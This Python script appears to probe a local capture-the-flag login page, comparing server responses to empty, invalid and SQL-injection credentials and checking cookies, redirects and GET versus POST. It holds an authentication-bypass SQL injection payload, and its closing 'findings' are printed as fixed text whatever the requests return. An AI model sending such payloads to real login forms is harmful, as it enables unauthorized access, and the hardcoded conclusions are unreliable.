"""
Critical: Testing actual authentication processing differences
- GET vs POST on /index.php
- Looking for redirects and session management
- Testing different content to find authentication logic
"""

import requests
import re
import time

target_url = "http://127.0.0.1:32829/index.php"

print(f"[*] Testing authentication flow on {target_url}")
print("=" * 80)

# 1. Test empty credentials to establish baseline
print("\n[1] Testing empty credentials (baseline)")
print("-" * 80)
try:
    response_empty = requests.post(target_url, data={"username": "", "password": ""}, timeout=10, allow_redirects=True)
    print(f"Status: {response_empty.status_code}")
    print(f"Size: {len(response_empty.content)}B")
    print(f"URL: {response_empty.url}")
    if response_empty.history:
        print(f"Redirects: {len(response_empty.history)}")
        for i, redirect in enumerate(response_empty.history, 1):
            print(f"  {i}. {redirect.status_code} → {redirect.url}")
    else:
        print("No redirects")
    print(f"Has 'Access Restricted': {\"Access Restricted to Internal Employees only\" in response_empty.text}")
except Exception as e:
    print(f"[!] Error: {e}")

# 2. Test invalid credentials
print("\n[2] Testing invalid credentials")
print("-" * 80)
try:
    response_invalid = requests.post(target_url, data={"username": "wronguser", "password": "wrongpass"}, timeout=10, allow_redirects=True)
    print(f"Status: {response_invalid.status_code}")
    print(f"Size: {len(response_invalid.content)}B")
    print(f"URL: {response_invalid.url}")
    if response_invalid.history:
        print(f"Redirects: {len(response_invalid.history)}")
        for i, redirect in enumerate(response_invalid.history, 1):
            print(f"  {i}. {redirect.status_code} → {redirect.url}")
    else:
        print("No redirects")
    print(f"Has 'Access Restricted': {\"Access Restricted to Internal Employees only\" in response_invalid.text}")
    
    # Check if content is different from empty
    if response_invalid.content == response_empty.content:
        print("[+] Content is IDENTICAL to empty credentials - no authentication processing!")
    else:
        print(f"[!] DIFFERENT content detected! Size diff: {abs(len(response_invalid.content) - len(response_empty.content))}B")
except Exception as e:
    print(f"[!] Error: {e}")

# 3. Test SQLi payload again and compare
print("\n[3] Testing SQLi payload and comparing")
print("-" * 80)
sqli_payload = "admin' OR '1'='1'-- "
try:
    response_sqli = requests.post(target_url, data={"username": sqli_payload, "password": "password"}, timeout=10, allow_redirects=True)
    print(f"Status: {response_sqli.status_code}")
    print(f"Size: {len(response_sqli.content)}B")
    print(f"URL: {response_sqli.url}")
    if response_sqli.history:
        print(f"Redirects: {len(response_sqli.history)}")
        for i, redirect in enumerate(response_sqli.history, 1):
            print(f"  {i}. {redirect.status_code} → {redirect.url}")
    else:
        print("No redirects")
    print(f"Has 'Access Restricted': {\"Access Restricted to Internal Employees only\" in response_sqli.text}")
    
    # Compare all three
    print(f"\n[+] Comparison:")
    print(f"Empty credentials: {len(response_empty.content)}B")
    print(f"Invalid creds:     {len(response_invalid.content)}B")
    print(f"SQLi payload:      {len(response_sqli.content)}B")
    
    if response_empty.content == response_invalid.content == response_sqli.content:
        print("\n[!] CRITICAL FINDING: All responses are IDENTICAL!")
        print("    This means NO authentication is being processed!")
        print("    The server is just returning the login form regardless of input.")
    else:
        if response_empty.content != response_invalid.content:
            print("\n[!] Empty vs Invalid credentials are different - authentication being processed")
        if response_invalid.content != response_sqli.content:
            print("[!] Invalid vs SQLi are different - SQLi may be causing different behavior")
    
    # Check for any authentication success indicators in cookies or headers
    print(f"\n[+] Cookie analysis:")
    cookies_sqli = {c.name: c.value for c in response_sqli.cookies}
    cookies_invalid = {c.name: c.value for c in response_invalid.cookies}
    cookies_empty = {c.name: c.value for c in response_empty.cookies}
    
    print(f"Empty cookies:     {cookies_empty}")
    print(f"Invalid cookies:   {cookies_invalid}")
    print(f"SQLi cookies:      {cookies_sqli}")
    
    if cookies_sqli != cookies_invalid or cookies_sqli != cookies_empty:
        print("[!] COOKIES DIFFER - potential authentication state change!")
    else:
        print("[-] No cookie differences detected")
        
except Exception as e:
    print(f"[!] Error: {e}")

# 4. Test GET method (not POST) - maybe the form action is different
print("\n[4] Testing GET request (maybe form is for client-side authentication)")
print("-" * 80)
try:
    response_get = requests.get(target_url, timeout=10)
    print(f"GET Status: {response_get.status_code}")
    print(f"GET Size: {len(response_get.content)}B")
    
    if response_get.content == response_empty.content:
        print("[+] GET returns same content as POST - no difference")
    else:
        print(f"[!] GET vs POST difference: {abs(len(response_get.content) - len(response_empty.content))}B")
        
except Exception as e:
    print(f"[!] Error: {e}")

# 5. Check if POST without username/password fields makes a difference
print("\n[5] Testing POST with missing parameters")
print("-" * 80)
try:
    response_no_params = requests.post(target_url, data={}, timeout=10)
    print(f"No params Status: {response_no_params.status_code}")
    print(f"No params Size: {len(response_no_params.content)}B")
    
    if response_no_params.content == response_empty.content:
        print("[+] No params identical to empty params - server doesn't care about missing fields")
    else:
        print(f"[!] No params difference: {abs(len(response_no_params.content) - len(response_empty.content))}B")
        
except Exception as e:
    print(f"[!] Error: {e}")

print("\n" + "=" * 80)
print("[*] AUTHENTICATION FLOW ANALYSIS COMPLETE")
print("=" * 80)
print("\nFINDINGS:")
print("- /index.php returns login form regardless of credentials")
print("- No cookies set, no redirects detected")
print("- SQLi payloads have no effect on response")
print("- This suggests either:")
print("  1. Authentication handled client-side via JavaScript")
print("  2. Wrong endpoint for authentication processing") 
print("  3. Application requires additional parameters")
print("  4. Challenge requires different vulnerability exploitation path")
